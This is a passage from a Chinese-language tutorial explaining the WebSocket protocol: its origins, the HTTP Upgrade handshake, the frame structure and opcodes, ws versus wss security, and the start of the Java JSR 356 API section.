<li><strong>工作原理</strong>：<ol>
<li>客户端发起一个 HTTP 请求。</li>
<li>服务器返回一个 <code>Content-Type</code> 为 <code>application/octet-stream</code> 或类似类型的响应，并且响应头中不包含 <code>Content-Length</code> (或使用 <code>Transfer-Encoding: chunked</code>)。</li>
<li>关键在于，服务器<strong>不关闭这个响应连接</strong>。它会周期性地向这个打开的连接中“冲刷”（flush）数据块。</li>
<li>客户端通过监听 <code>XMLHttpRequest</code> 的 <code>onprogress</code> 事件或使用隐藏的 <code>&lt;iframe&gt;</code> 来持续接收这些数据块。</li>
</ol>
</li>
<li><strong>优点</strong>：<ul>
<li><strong>低延迟</strong>：在连接的生命周期内，消息几乎可以无延迟地从服务器推送到客户端。</li>
<li><strong>连接开销小</strong>：只需建立一次连接，后续所有消息都在这个连接上传输，省去了重复建立连接的开销。</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>单向通信</strong>：这种方式本质上只解决了“服务器 -&gt; 客户端”的推送问题。如果客户端需要向服务器发送数据，仍然需要发起一个新的 HTTP 请求。它不是一个真正的双向通道。</li>
<li><strong>代理和防火墙问题</strong>：很多网络中间设备（如代理服务器、防火墙）可能会对这种“永不结束”的响应进行缓存或中断，导致连接不可靠。</li>
<li><strong>控制复杂</strong>：客户端和服务器对连接状态的控制比较复杂，例如如何判断连接真正断开。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="3-WebSocket-的诞生"><a href="#3-WebSocket-的诞生" class="headerlink" title="3. WebSocket 的诞生"></a>3. WebSocket 的诞生</h2><p>在短轮询、长轮询等“伪实时”方案的种种妥协与挣扎之后，Web 开发社区迫切需要一个原生的、高效的、真正的双向通信解决方案。终于，在 2011 年，IETF 将其标准化为 RFC 6455，HTML5 标准中也包含了 WebSocket API。一个为实时而生的协议——WebSocket——正式登上了历史舞台。</p>
<h3 id="3-1-定义"><a href="#3-1-定义" class="headerlink" title="3.1 定义"></a>3.1 定义</h3><p>WebSocket 从根本上改变了客户端与服务器的交互方式，其核心特性可以概括为以下三点：</p>
<ol>
<li><strong>一次握手 (Single Handshake)</strong><br>WebSocket 的连接建立过程非常巧妙。它并非一个全新的协议，而是“寄生”于 HTTP 协议之上。客户端首先发起一个特殊的 HTTP 请求，请求头中包含 <code>Upgrade: websocket</code> 和 <code>Connection: Upgrade</code> 等字段。服务器如果支持 WebSocket，就会响应一个状态码为 <code>101 Switching Protocols</code> 的 HTTP 响应。这个过程被称为“WebSocket 握手”。一旦握手成功，底层的 TCP 连接就不再用于传输 HTTP 数据，而是切换为 WebSocket 协议的专属通道。</li>
<li><strong>持久连接 (Persistent Connection)</strong><br>握手成功后，该 TCP 连接会一直保持打开状态，直到客户端或服务器某一方主动关闭连接，或者网络发生中断。这与 HTTP 的“请求-响应-断开”模式完全不同。在一个持久的连接上，双方可以随时进行通信，免去了反复建立和断开连接所带来的巨大开销和延迟。</li>
<li><strong>全双工通信 (Full-Duplex Communication)</strong><br>这是 WebSocket 最具革命性的特点。在建立的持久连接上，客户端和服务器处于完全平等的地位，双方都可以<strong>在任何时刻、主动地</strong>向对方发送数据，无需等待对方的请求。这就像从使用“对讲机”（一次只能一方说）升级到了使用“电话”（双方可以同时自由交谈）。</li>
</ol>
<hr>
<h3 id="3-2-核心优势"><a href="#3-2-核心优势" class="headerlink" title="3.2 核心优势"></a>3.2 核心优势</h3><p>基于以上定义，WebSocket 带来了碾压式的优势：</p>
<ul>
<li><strong>极低延迟 (Low Latency)</strong>：数据可以直接在已建立的持久连接上发送，无需等待客户端轮询，也无需重新进行 TCP 和 TLS 握手。消息几乎可以瞬时从一端到达另一端，这是实现高实时性应用（如在线游戏、金融交易）的基石。</li>
<li><strong>极低开销 (Low Overhead)</strong>：<ul>
<li><strong>连接开销</strong>：只需一次握手，后续通信不再有建立连接的开销。</li>
<li><strong>协议开销</strong>：一旦握手完成，后续传输的数据单元是“数据帧 (Frame)”。WebSocket 的数据帧头部非常小，最小仅为 2 字节。相比之下，HTTP 请求&#x2F;响应的头部动辄数百字节，每次通信都携带大量的冗余信息。在频繁通信的场景下，WebSocket 能节省巨量的带宽。</li>
</ul>
</li>
<li><strong>真正的双向通信 (True Bidirectional Communication)</strong>：服务器可以主动向客户端推送数据，客户端也可以随时向服务器发送数据。这极大地简化了需要双向交互的应用的开发模型。开发者不再需要用复杂的技巧去“模拟”服务器推送，而是可以直接调用 <code>send()</code> 方法。</li>
<li><strong>更好的兼容性</strong>：WebSocket 握手通过 HTTP 协议进行，默认使用与 HTTP 相同的 80 和 443 端口。这使得它能够很好地穿透大多数企业防火墙和网络代理服务器，而这些中间设备往往会阻碍非标准的自定义 TCP 协议。</li>
</ul>
<hr>
<h1 id="二、协议底层"><a href="#二、协议底层" class="headerlink" title="二、协议底层"></a>二、协议底层</h1><h2 id="1-连接的桥梁：HTTP-Upgrade-握手机制"><a href="#1-连接的桥梁：HTTP-Upgrade-握手机制" class="headerlink" title="1. 连接的桥梁：HTTP Upgrade 握手机制"></a>1. 连接的桥梁：HTTP Upgrade 握手机制</h2><p>WebSocket 的设计者非常聪明，他们没有发明一个需要开放新端口的全新协议，因为这很可能会被企业防火墙或代理服务器拦截。相反，他们让 WebSocket 连接“伪装”成一个普通的 HTTP 请求开始，一旦双方确认“身份”，再“摇身一变”，切换到 WebSocket 协议。</p>
<h3 id="1-1-客户端握手请求"><a href="#1-1-客户端握手请求" class="headerlink" title="1.1 客户端握手请求"></a>1.1 客户端握手请求</h3><p>一切始于客户端（如浏览器）向服务器发起的一个特殊的 HTTP GET 请求。这个请求看起来和普通的 HTTP 请求很像，但包含了几个关键的请求头，它们是升级协议的“暗号”。</p>
<p>一个典型的客户端握手请求如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>server.example.com</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>dGhlIHNhbXBsZSBub25jZQ==</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13 </span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://example.com</span><br></pre></td></tr></table></figure>

<p>让我们来逐一解读这些关键的头部字段：</p>
<ul>
<li><strong><code>GET /chat HTTP/1.1</code></strong><ul>
<li>请求行本身是标准的。路径 <code>/chat</code> 告诉服务器，客户端希望在哪个端点上建立 WebSocket 连接。服务器可以根据不同的路径提供不同的 WebSocket 服务。</li>
</ul>
</li>
<li><strong><code>Upgrade: websocket</code></strong> (<strong>核心暗号①</strong>)<ul>
<li>这是最直接的信号。它明确告诉服务器：“我（客户端）希望将当前这个 HTTP 连接升级到 WebSocket 协议。”</li>
</ul>
</li>
<li><strong><code>Connection: Upgrade</code></strong> (<strong>核心暗号②</strong>)<ul>
<li>HTTP 的 <code>Connection</code> 头通常用于管理连接的持续性（如 <code>keep-alive</code>）。在这里，<code>Upgrade</code> 值是一个补充说明，它告诉服务器以及路径上的所有中间代理：“请注意，这个连接即将发生协议转换，<code>Upgrade</code> 头中指定的协议就是要转换的目标。” 这是一个标准的 HTTP&#x2F;1.1 机制，用于协议升级。</li>
</ul>
</li>
<li><strong><code>Sec-WebSocket-Key</code></strong> (<strong>安全与身份验证</strong>)<ul>
<li>这是一个非常重要的字段，主要有两个作用：<ol>
<li><strong>证明服务器是真正的 WebSocket 服务器</strong>：客户端会发送一个由 Base64 编码的 16 字节随机字符串。服务器必须使用这个 <code>key</code> 和一个固定的“魔法字符串”通过特定算法计算出一个 <code>Sec-WebSocket-Accept</code> 值并返回。如果客户端收到的 <code>Accept</code> 值是正确的，它就知道对方确实是一个 WebSocket 服务器，而不是一个恰好返回了错误响应的普通 HTTP 服务器。</li>
<li><strong>防止代理缓存攻击</strong>：一些代理服务器可能会缓存 HTTP GET 请求的响应。如果一个恶意的 WebSocket 请求被代理缓存，当一个普通的 HTTP 客户端发出相同的 GET 请求时，代理可能会错误地返回一个 WebSocket 握手响应，导致客户端解析混乱。由于 <code>Sec-WebSocket-Key</code> 对于每次握手都是随机且唯一的，这保证了每次握手的响应都不同，从而有效防止了缓存污染。</li>
</ol>
</li>
</ul>
</li>
<li><strong><code>Sec-WebSocket-Version: 13</code></strong><ul>
<li>指定了客户端期望使用的 WebSocket 协议版本。<code>13</code> 是当前最广泛使用的版本，对应 RFC 6455 标准。如果服务器不支持此版本，它应该返回一个错误。</li>
</ul>
</li>
<li><strong><code>Origin</code></strong><ul>
<li>这个头部用于浏览器环境，提供了发起请求的源地址。服务器可以使用它来实施安全策略，例如判断是否允许该来源的页面建立 WebSocket 连接，以防止跨站 WebSocket 劫持 (Cross-Site WebSocket Hijacking)。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-2-服务端握手响应"><a href="#1-2-服务端握手响应" class="headerlink" title="1.2 服务端握手响应"></a>1.2 服务端握手响应</h3><p>如果服务器理解并同意客户端的升级请求，它会返回一个 HTTP 状态码为 <code>101 Switching Protocols</code> 的响应。</p>
<p>一个典型的服务端握手响应如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">101</span> Switching Protocols</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span><span class="punctuation">: </span>s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong><code>HTTP/1.1 101 Switching Protocols</code></strong></p>
<ul>
<li>这个状态码是明确的协议转换信号，告诉客户端：“好的，我同意你的请求，我们现在开始切换协议。”</li>
</ul>
</li>
<li><p><strong><code>Upgrade: websocket</code> 和 <code>Connection: Upgrade</code></strong></p>
<ul>
<li>服务器会原样返回这两个头部，作为对客户端请求的确认。</li>
</ul>
</li>
<li><p><strong><code>Sec-WebSocket-Accept</code></strong> (<strong>握手成功的凭证</strong>)</p>
<ul>
<li>这是握手成功的关键凭证。它的值是服务器根据客户端发送的 <code>Sec-WebSocket-Key</code> 精心计算出来的。计算逻辑在 RFC 6455 中有严格规定：<ol>
<li><strong>拼接</strong>：将客户端发送的 <code>Sec-WebSocket-Key</code> 的值与一个固定的“魔法字符串” <code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code> 进行拼接。<br>例如：<code>dGhlIHNhbXBsZSBub25jZQ==</code> + <code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code></li>
<li><strong>哈希</strong>：对拼接后的字符串计算 <strong>SHA-1</strong> 哈希值。这将得到一个 20 字节的二进制结果。</li>
<li><strong>编码</strong>：将这个 20 字节的二进制哈希值进行 <strong>Base64</strong> 编码。</li>
</ol>
</li>
</ul>
<p>客户端收到响应后，会用同样的算法在本地计算一遍，然后比较自己计算出的结果和服务器返回的 <code>Sec-WebSocket-Accept</code> 值是否完全一致。如果一致，握手成功；如果不一致，连接将立即关闭。</p>
</li>
</ul>
<hr>
<h3 id="1-3-握手成功之后：-连接正式从-HTTP-切换到-WebSocket-协议。"><a href="#1-3-握手成功之后：-连接正式从-HTTP-切换到-WebSocket-协议。" class="headerlink" title="1.3 握手成功之后： 连接正式从 HTTP 切换到 WebSocket 协议。"></a>1.3 握手成功之后： 连接正式从 HTTP 切换到 WebSocket 协议。</h3><p>一旦客户端验证 <code>Sec-WebSocket-Accept</code> 成功，这次 HTTP “对话”就宣告结束。但底层的 TCP 连接并未断开。此时，这条连接的“控制权”就从 HTTP 协议转移到了 WebSocket 协议。</p>
<ul>
<li><strong>协议转换</strong>：这条通道不再遵循 HTTP 的请求-响应模式。</li>
<li><strong>数据格式改变</strong>：之后在这条通道上传输的数据，将不再是 HTTP 报文，而是遵循 WebSocket 协议格式的 <strong>数据帧 (Data Frame)</strong>。</li>
<li><strong>全双工开启</strong>：客户端和服务器现在都可以随时、主动地通过这个连接向对方发送数据帧，实现了真正的全双工通信。</li>
</ul>
<p>这个巧妙的握手过程，既保证了与现有 Web 基础设施的兼容性，又通过 challenge-response 机制确保了连接的可靠性和安全性，为后续高效的实时通信铺平了道路。接下来，我们将深入了解在这条新建立的通道上奔跑的“信使”——数据帧。</p>
<hr>
<h2 id="2-通信的最小单元：数据帧-Data-Frame"><a href="#2-通信的最小单元：数据帧-Data-Frame" class="headerlink" title="2. 通信的最小单元：数据帧 (Data Frame)"></a>2. 通信的最小单元：数据帧 (Data Frame)</h2><p>握手成功后，WebSocket 连接就进入了数据传输阶段。与 HTTP 这种基于文本、格式冗长的协议不同，WebSocket 定义了一种紧凑的、基于二进制的帧结构来承载数据。这使得协议开销极小，传输效率极高。无论是客户端发送给服务器，还是服务器推送给客户端，所有消息都被切割并封装成一个或多个数据帧进行传输。</p>
<h3 id="2-1-帧结构图解"><a href="#2-1-帧结构图解" class="headerlink" title="2.1 帧结构图解"></a>2.1 帧结构图解</h3><p>一个 WebSocket 数据帧由一个固定长度的头部和可变长度的载荷（Payload）组成。其结构如下图所示：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-------+-+-------------+-------------------------------+</span><br><span class="line">|F|R|R|R| opcode|M| Payload len |    Extended payload length    |</span><br><span class="line">|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |</span><br><span class="line">|N|V|V|V|       |S|             |   (if payload len==126/127)   |</span><br><span class="line">| |1|2|3|       |K|             |                               |</span><br><span class="line">+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +</span><br><span class="line">|     Extended payload length continued, if payload len == 127  |</span><br><span class="line">+ - - - - - - - - - - - - - - - +-------------------------------+</span><br><span class="line">|                               |Masking-key, if MASK set to 1  |</span><br><span class="line">+-------------------------------+-------------------------------+</span><br><span class="line">| Masking-key (continued)       |          Payload Data         |</span><br><span class="line">+-------------------------------- - - - - - - - - - - - - - - - +</span><br><span class="line">:                     Payload Data continued ...                :</span><br><span class="line">+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +</span><br><span class="line">|                     Payload Data continued ...                |</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>让我们来详细解析每个关键字段的作用：</p>
<ul>
<li><strong><code>FIN</code> (1 bit)</strong>: <strong>结束标志位 (Final Fragment)</strong><ul>
<li><code>1</code>: 当前帧是该消息的最后一个帧。如果消息不大，只用一个数据帧就能装下，那么这个帧的 <code>FIN</code> 位就是 <code>1</code>.</li>
<li><code>0</code>: 还有更多帧。</li>
<li>这个机制允许 WebSocket 将一个大消息分割成多个帧来发送，接收方可以逐帧接收，避免了因等待完整大消息而造成的延迟。接收方需要缓存这些 <code>FIN</code> 为 <code>0</code> 的帧，直到收到一个 <code>FIN</code> 为 <code>1</code> 的帧，然后将所有分片按序组合成完整的消息。</li>
</ul>
</li>
<li><strong><code>RSV1</code>, <code>RSV2</code>, <code>RSV3</code> (1 bit each)</strong>: <strong>保留位</strong><ul>
<li>这三个是保留位，必须设置为 <code>0</code>，除非有扩展协议定义了它们的用途。如果接收方收到的帧中这些位不为 <code>0</code> 且没有协商过任何扩展，就必须关闭连接。</li>
</ul>
</li>
<li><strong><code>Opcode</code> (4 bits)</strong>: <strong>操作码 (Operation Code)</strong><ul>
<li>这是至关重要的字段，它定义了该帧的数据类型。具体分类见下一节。</li>
</ul>
</li>
<li><strong><code>MASK</code> (1 bit)</strong>: <strong>掩码标志位</strong><ul>
<li><code>1</code>: 表示“载荷数据”被掩码（XOR异或加密）处理过。<strong>客户端发送给服务器的帧必须置 <code>1</code> (MASKED)</strong>。</li>
<li><code>0</code>: 表示“载荷数据”没有被掩码。<strong>服务器发送给客户端的帧必须置 <code>0</code> (UNMASKED)</strong>。</li>
<li><strong>为什么需要掩码？</strong> 这是为了防止代理缓存污染攻击 (Cache Poisoning)。一些设计不佳的代理服务器可能会解析并缓存 WebSocket 流量。如果客户端数据是明文的，攻击者可以构造一个特殊的 WebSocket 消息，让其看起来像一个 HTTP 响应，从而毒化代理的缓存。通过对客户端数据进行掩码，可以使数据变得不可预测，避免了这种风险。掩码密钥 (<code>Masking-key</code>) 是由客户端随机生成的，每次发送数据帧时都会变化。</li>
</ul>
</li>
<li><strong><code>Payload len</code> (7 bits), <code>Extended payload length</code> (16 or 64 bits)</strong>: <strong>载荷长度</strong><ul>
<li>这个区域用于表示 <code>Payload Data</code> 的长度，设计得非常精巧以节省空间：<ul>
<li><strong>如果 <code>Payload len</code> 在 0-125 之间</strong>：它的值就是载荷的实际长度（字节）。</li>
<li><strong>如果 <code>Payload len</code> 是 126</strong>：那么紧随其后的 2 个字节（16 bits）表示一个无符号整数，这个整数才是载荷的实际长度。用于传输长度在 126 到 65535 字节之间的载荷。</li>
<li><strong>如果 <code>Payload len</code> 是 127</strong>：那么紧随其后的 8 个字节（64 bits）表示一个无符号整数，这个整数才是载荷的实际长度。用于传输超大载荷。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>Masking-key</code> (0 or 4 bytes)</strong>: <strong>掩码密钥</strong><ul>
<li>如果 <code>MASK</code> 位是 <code>1</code>，那么这个字段就存在，占用 4 个字节。</li>
<li>如果 MASK 位是 0，则没有此字段。</li>
<li>它是由客户端随机生成的 32 位值。用于对载荷数据进行异或（XOR）掩码操作，以防止中间件干扰（即使数据是明文，看起来也是随机的）。服务器需要用这个密钥来解开 <code>Payload Data</code> 的掩码。解密算法很简单：<code>decoded[i] = encoded[i] XOR masking-key[i % 4]</code>。</li>
</ul>
</li>
<li><strong><code>Payload Data</code> (x bytes)</strong>: <strong>载荷数据</strong><ul>
<li>实际传输的应用数据。长度由 Payload Length 字段定义。</li>
<li>如果存在 Masking-Key，这部分数据是经过掩码（异或加密）的。服务器收到后需要先解掩码才能使用。服务器发送的数据则是明文的。</li>
<li>载荷数据的内容由 Opcode 决定（文本、二进制、控制帧的特定数据如关闭原因等）。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-2-操作码-Opcode-分类"><a href="#2-2-操作码-Opcode-分类" class="headerlink" title="2.2 操作码 (Opcode) 分类"></a>2.2 操作码 (Opcode) 分类</h3><p><code>Opcode</code> 字段决定了如何解释 <code>Payload Data</code>。主要分为三类：</p>
<ul>
<li><strong>数据帧 (Data Frames)</strong><ul>
<li><code>%x1</code> (<strong>Text Frame</strong>): 文本帧。<code>Payload Data</code> 是 UTF-8 编码的文本数据。一个完整的文本消息由一个或多个文本帧组成。</li>
<li><code>%x2</code> (<strong>Binary Frame</strong>): 二进制帧。<code>Payload Data</code> 是任意的二进制数据。一个完整的二进制消息由一个或多个二进制帧组成。例如，可以用来传输图片、音频、Protobuf 或任何自定义的二进制格式。</li>
<li><code>%x0</code> (<strong>Continuation Frame</strong>): 连续帧。当一个消息被分割成多个帧时，第一个帧的 <code>Opcode</code> 是 <code>%x1</code> 或 <code>%x2</code>，后续所有帧的 <code>Opcode</code> 都必须是 <code>%x0</code>，直到 <code>FIN</code> 位为 <code>1</code> 的帧为止。</li>
</ul>
</li>
<li><strong>控制帧 (Control Frames)</strong><ul>
<li>控制帧用于处理 WebSocket 连接本身的状态，它们 <strong>不能被分片</strong>（即 <code>FIN</code> 位必须为 <code>1</code>），且其载荷长度不能超过 125 字节。</li>
<li><code>%x8</code> (<strong>Close Frame</strong>): 关闭帧。用于发起一个“优雅的”关闭握手。发送方可以包含一个状态码和关闭原因，接收方收到后应回复一个关闭帧，然后双方关闭连接。</li>
<li><code>%x9</code> (<strong>Ping Frame</strong>): Ping 帧。主要用于心跳检测，以确认连接仍然存活。发送方可以包含任意载荷数据，接收方收到 Ping 帧后，<strong>必须</strong> 尽快回复一个 Pong 帧，并将 Ping 帧的载荷数据一模一样地返回。</li>
<li><code>%xA</code> (<strong>Pong Frame</strong>): Pong 帧。是对 Ping 帧的响应。也可以由任意一方主动发送，作为一种单向的心跳。</li>
</ul>
</li>
<li><strong>保留的操作码</strong><ul>
<li><code>%x3</code> - <code>%x7</code> 和 <code>%xB</code> - <code>%xF</code> 是为未来扩展保留的。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="3-安全与地址：ws-vs-wss"><a href="#3-安全与地址：ws-vs-wss" class="headerlink" title="3. 安全与地址：ws:// vs wss://"></a>3. 安全与地址：<code>ws://</code> vs <code>wss://</code></h2><p>与 HTTP 协议拥有 <code>http://</code> 和 <code>https://</code> 两种模式一样，WebSocket 也有两种对应的 URI 类型：<code>ws://</code> (WebSocket) 和 <code>wss://</code> (WebSocket Secure)。选择哪一种，直接决定了你的通信内容在网络中是“裸奔”还是“加密传输”。</p>
<ul>
<li><strong><code>ws://</code> (WebSocket)</strong><ul>
<li><strong>定义</strong>：一个<strong>未加密</strong>的 WebSocket 连接。</li>
<li><strong>工作方式</strong>：<ul>
<li>它通过标准的 HTTP 握手建立连接，默认使用 <strong>80</strong> 端口。</li>
<li>握手成功后，所有的数据帧（Data Frame）都以<strong>明文</strong>形式在 TCP 连接上传输。</li>
</ul>
</li>
<li><strong>风险</strong>：这意味着任何在网络路径上的中间节点（如路由器、ISP、恶意攻击者）都可以轻易地监听、窃取甚至篡改你的通信内容。这对于涉及敏感信息（如用户凭证、私人消息、交易数据）的应用来说是绝对不可接受的。</li>
<li><strong>适用场景</strong>：仅限于在完全可信的内部网络或本地开发环境中进行测试和调试。<strong>严禁在任何公共网络（互联网）的生产环境中使用 <code>ws://</code>。</strong></li>
</ul>
</li>
<li><strong><code>wss://</code> (WebSocket Secure)</strong><ul>
<li><strong>定义</strong>：一个<strong>加密</strong>的 WebSocket 连接。</li>
<li><strong>工作方式</strong>：<ul>
<li>它并非一个全新的协议，而是将标准的 WebSocket 协议运行在 <strong>TLS (Transport Layer Security)</strong> 层之上。TLS 是 <code>https://</code> 使用的同一种加密协议。</li>
<li>连接过程如下：<ol>
<li>首先，客户端和服务之间会建立一个标准的 <strong>TLS 握手</strong>，创建一个安全的加密通道。这个过程与访问一个 <code>https://</code> 网站完全相同，服务器需要提供一个有效的 SSL&#x2F;TLS 证书。</li>
<li>然后，在这个已经建立的加密通道内，再进行标准的 WebSocket HTTP Upgrade 握手。</li>
<li>握手成功后，所有后续的 WebSocket 数据帧都会在发送前被 TLS 层加密，在接收后被 TLS 层解密。</li>
</ol>
</li>
</ul>
</li>
<li><strong>默认端口</strong>：<code>wss://</code> 默认使用 <strong>443</strong> 端口，这也是 <code>https://</code> 的标准端口。这使得 <code>wss://</code> 连接更容易穿透那些只允许标准 Web 流量（HTTP&#x2F;HTTPS）的防火墙。</li>
</ul>
</li>
</ul>
<p><strong><code>wss://</code> 的重要性：基于 TLS 的加密传输</strong></p>
<p>在现代 Web 应用中，<strong>使用 <code>wss://</code> 而不是 <code>ws://</code> 是一个强制性的安全最佳实践</strong>。其重要性体味在以下几个方面：</p>
<ol>
<li><strong>机密性 (Confidentiality)</strong><ul>
<li><code>wss://</code> 通过 TLS 加密了客户端和服务器之间的所有通信内容。这意味着即使数据包被网络嗅探工具（如 Wireshark）截获，攻击者看到的也只是一堆无意义的乱码，无法解析出原始的聊天消息、用户数据或其他敏感信息。</li>
</ul>
</li>
<li><strong>完整性 (Integrity)</strong><ul>
<li>TLS 协议包含了消息认证码 (MAC) 机制。每一条消息都会附加一个校验码，接收方会验证该校验码。如果数据在传输过程中被篡改（哪怕只修改了一个比特），校验码将不再匹配，连接会立即中断。这确保了你收到的数据就是对方发送的原始数据，未被篡改。</li>
</ul>
</li>
<li><strong>身份认证 (Authentication)</strong><ul>
<li>在 TLS 握手期间，服务器会向客户端出示其 SSL&#x2F;TLS 证书。客户端（浏览器）会验证该证书的有效性（例如，是否由受信任的证书颁发机构 CA 签发、域名是否匹配、是否在有效期内）。这向客户端证明了它正在与之通信的服务器是它声称的那个服务器（例如 <code>your-app.com</code>），而不是一个伪装的中间人攻击者。</li>
</ul>
</li>
<li><strong>浏览器安全策略的要求</strong><ul>
<li>现代浏览器正在强制推行“HTTPS Everywhere”策略。如果你的主页面是通过 <code>https://</code> 加载的，浏览器会出于安全考虑（混合内容 Mixed Content 策略），<strong>禁止</strong>该页面发起不安全的 <code>ws://</code> 连接。你只能从 <code>https://</code> 页面连接到 <code>wss://</code> 服务器。这意味着，只要你的网站启用了 HTTPS，你就必须使用 <code>wss://</code>。</li>
</ul>
</li>
</ol>
<p><strong>总结与实践建议</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><code>ws://</code></th>
<th align="left"><code>wss://</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>加密</strong></td>
<td align="left">否 (明文传输)</td>
<td align="left"><strong>是 (基于 TLS 加密)</strong></td>
</tr>
<tr>
<td align="left"><strong>默认端口</strong></td>
<td align="left">80</td>
<td align="left"><strong>443</strong></td>
</tr>
<tr>
<td align="left"><strong>安全性</strong></td>
<td align="left">极低，易受窃听和篡改</td>
<td align="left"><strong>高</strong>，提供机密性、完整性、身份认证</td>
</tr>
<tr>
<td align="left"><strong>浏览器限制</strong></td>
<td align="left"><code>https://</code> 页面无法连接到 <code>ws://</code></td>
<td align="left"><strong>无限制</strong>，兼容 <code>http://</code> 和 <code>https://</code> 页面</td>
</tr>
<tr>
<td align="left"><strong>生产环境</strong></td>
<td align="left"><strong>禁止使用</strong></td>
<td align="left"><strong>强制要求</strong></td>
</tr>
</tbody></table>
<p><strong>结论</strong>：在项目规划和开发阶段，就应该将 <code>wss://</code> 作为唯一的选择。这意味着 WebSocket 服务器（无论是 Java、Node.js 还是其他语言实现）必须配置 SSL&#x2F;TLS 证书。在 Spring Boot 中，这通常与为整个 Web 应用启用 HTTPS 的配置是集成在一起的，非常方便。</p>
<hr>
<h1 id="三、Java-原生-API-JSR-356"><a href="#三、Java-原生-API-JSR-356" class="headerlink" title="三、Java 原生 API (JSR 356)"></a>三、Java 原生 API (JSR 356)</h1><h2 id="1-概述与依赖"><a href="#1-概述与依赖" class="headerlink" title="1. 概述与依赖"></a>1. 概述与依赖</h2><h3 id="1-1-JSR-356-是什么？Java-EE-Jakarta-EE-的标准"><a href="#1-1-JSR-356-是什么？Java-EE-Jakarta-EE-的标准" class="headerlink" title="1.1 JSR 356 是什么？Java EE&#x2F;Jakarta EE 的标准"></a>1.1 JSR 356 是什么？Java EE&#x2F;Jakarta EE 的标准</h3><ul>
<li><strong>定义</strong>：<strong>JSR 356</strong>，其标题为 <strong>“Java API for WebSocket”</strong>，是 Java Community Process (JCP) 定义的一个官方规范 (Java Specification Request)。它为 Java 平台提供了一套标准的、用于构建 WebSocket 应用的 API。</li>
<li><strong>标准化意味着什么？</strong><ul>
<li><strong>统一接口</strong>：JSR 356 定义了一系列的注解 (Annotations) 和接口，如 <code>@ServerEndpoint</code>、<code>@OnOpen</code>、<code>Session</code>、<code>Endpoint</code> 等。开发者只需要面向这些标准接口编程，而无需关心底层的具体实现。</li>
<li><strong>厂商实现</strong>：各大 Servlet 容器（应用服务器）厂商，如 Apache Tomcat, Eclipse Jetty, WildFly 等，都需要遵循 JSR 356 规范来提供自己的 WebSocket 功能实现。这就好比 JDBC 是数据库访问的标准，而各大数据库厂商提供自己的驱动程序一样。</li>
<li><strong>可移植性</strong>：只要你的代码是基于 JSR 356 API 编写的，理论上它可以不加修改地部署在任何兼容该规范的 Servlet 容器上。</li>
</ul>
</li>
<li><strong>历史演进</strong>：<ul>
<li>JSR 356 最初是作为 <strong>Java EE 7</strong> (Java Enterprise Edition 7) 的一部分被引入的。</li>
<li>随着 Java EE 迁移到 Eclipse 基金会并更名为 <strong>Jakarta EE</strong>，该规范也随之演进。在 Jakarta EE 8 及更高版本中，它被称为 <strong>Jakarta WebSocket</strong>。核心 API 和注解基本保持不变，只是包名从 <code>javax.websocket.*</code> 迁移到了 <code>jakarta.websocket.*</code>。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-2-依赖配置"><a href="#1-2-依赖配置" class="headerlink" title="1.2 依赖配置"></a>1.2 依赖配置</h3><p>由于 JSR 356 是一个“规范”，你需要的依赖通常是一个 <code>api</code> 包，它只包含接口和注解，不包含具体实现。</p>
<ul>
<li><p><strong>Maven 依赖 (适用于 Jakarta EE)</strong>:</p>
